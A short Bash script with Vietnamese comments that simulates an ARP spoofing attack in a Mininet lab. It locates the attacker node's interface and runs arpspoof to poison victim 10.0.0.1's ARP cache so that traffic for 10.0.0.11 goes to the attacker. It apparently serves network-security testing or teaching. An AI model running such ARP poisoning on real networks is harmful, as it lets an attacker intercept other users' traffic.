#!/bin/bash
# ==============================================================================
# Tên script : arp_spoofing.sh
# Chức năng  : Mô phỏng tấn công giả mạo ARP (ARP Spoofing).
# Công cụ    : arpspoof
# ==============================================================================

VICTIM_IP="10.0.0.1"

# Khai báo địa chỉ IP hợp lệ (Benign Host) mà Attacker muốn mạo danh
SPOOFED_IP="10.0.0.11" 

# Tự động trích xuất tên giao diện mạng ảo của Attacker trong Mininet
# Logic: Tìm kiếm giao diện có định dạng h_atk[số]-eth0
INTERFACE=$(ip link show | grep -o 'h_atk[0-9]\+-eth0' | head -n 1)

# Kiểm tra tính hợp lệ của giao diện mạng trước khi thực thi
if [ -z "$INTERFACE" ]; then
    echo "[!] Lỗi hệ thống: Không thể định vị giao diện mạng của Node tấn công."
    exit 1
fi

echo "[*] Đã định vị giao diện mạng: $INTERFACE"
echo "[*] Khởi chạy tiến trình đầu độc bộ nhớ cache ARP đối với Mục tiêu ($VICTIM_IP)..."
echo "[*] Phân giải địa chỉ IP $SPOOFED_IP về địa chỉ MAC của Kẻ tấn công."
echo "[*] Nhấn [Ctrl+C] để kết thúc tiến trình."

# ------------------------------------------------------------------------------
# Chú giải tham số thực thi:
#   -i : Chỉ định giao diện mạng vật lý/ảo sẽ phát sóng các gói tin giả mạo.
#   -t : Chỉ định địa chỉ IP mục tiêu (Victim) nhận các gói tin ARP Reply lừa đảo.
# ------------------------------------------------------------------------------

arpspoof -i "$INTERFACE" -t "$VICTIM_IP" "$SPOOFED_IP"